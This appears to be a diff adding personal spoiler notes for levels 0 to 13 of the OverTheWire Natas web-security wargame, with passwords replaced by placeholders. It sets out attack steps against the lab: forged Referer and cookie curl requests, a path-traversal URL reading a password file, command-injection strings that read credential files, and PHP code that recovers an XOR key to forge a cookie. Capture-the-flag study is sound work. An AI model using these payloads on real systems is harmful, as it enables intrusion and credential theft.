@@ -1,0 +1,70 @@
+(Spoiler alert) Notes and passwords to some otw natas problems
+00 | natas0
+00->01 | <natas1 password>
+    Inspect
+01->02 | <natas2 password>
+    Dev tools
+02->03 | <natas3 password>
+    http://natas2.natas.labs.overthewire.org/files
+    http://natas2.natas.labs.overthewire.org/files/users.txt
+03->04 | <natas4 password>
+    Google
+    http://natas3.natas.labs.overthewire.org/robots.txt
+    http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
+04->05 | <natas5 password>
+    curl --user natas4:<natas4 password> --referer http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org/
+05->06 | <natas6 password>
+    curl -v --user natas5:<natas5 password> --cookie "loggedin=1" http://natas5.natas.labs.overthewire.org/
+06->07 | <natas7 password>
+    http://natas6.natas.labs.overthewire.org/index-source.html
+    http://natas6.natas.labs.overthewire.org/includes/secret.inc
+07->08 | <natas8 password>
+    http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+08->09 | <natas9 password>
+    http://natas8.natas.labs.overthewire.org/index-source.html
+    https://paiza.io/projects/2v1bOGbb8jbQ2RycX2OhwA
+        <?php
+        // Your code here!
+        function encodeSecret($secret) {
+            return bin2hex(strrev(base64_encode($secret)));
+        }
+
+        function decodeSecret($secret) {
+            return base64_decode(strrev(hex2bin($secret)));
+        }
+        print decodeSecret("3d3d516343746d4d6d6c315669563362")
+        ?>
+09-10 | <natas10 password>
+    "" ;  echo `ls -A `
+    "" ; cat "index.php" | tr "<" "a"; echo
+    "" ;  echo `ls -A /var/www/natas/natas9`
+    "" ;  echo `du / | grep pass`
+    "" ; cat "/etc/natas_webpass/natas10"; echo
+
+10-11 | <natas11 password>
+    "" `printf '\x3b'` cat "/etc/natas_webpass/natas11" `printf '\x3b'` echo
+11-12 | <natas12 password>
+    const keyElement="\n".charCodeAt() ^ "{".charCodeAt()
+    String.fromCharCode(keyElement)
+
+    http://natas11.natas.labs.overthewire.org/index-source.html
+
+    // extected json: print json_encode(array("showpassword"=>"no")); ('{"showpas')
+    // guess password form cookie and expected json
+
+        $key = 'qw8J';
+
+    $originalCookieData = "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSRwh6QUcIaAw=";
+    $decodedText = base64_decode($originalCookieData);
+    $decryptedText = xor_encrypt($decodedText);
+    $parsedData = json_decode($decryptedText);
+    print "originalCookieData: ".$originalCookieData."\n";
+    print "decoded: ".$decodedText."\n";
+    print "decrypted: ".$decryptedText."\n";
+    ?>
+
+    print base64_encode(xor_encrypt(json_encode(array("showpassword" => "yes", "bgcolor" => "#ffffff"))))
+    curl -v --user natas11:<natas11 password> --cookie "data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK" http://natas11.natas.labs.overthewire.org/
+
+12-13 | 
+    curl -v --user natas12:<natas12 password>  -F 'uploadedfile=@./natas.png' -F 'filename=natas.a' http://natas12.natas.labs.overthewire.org/index.php | lynx -dump -stdin
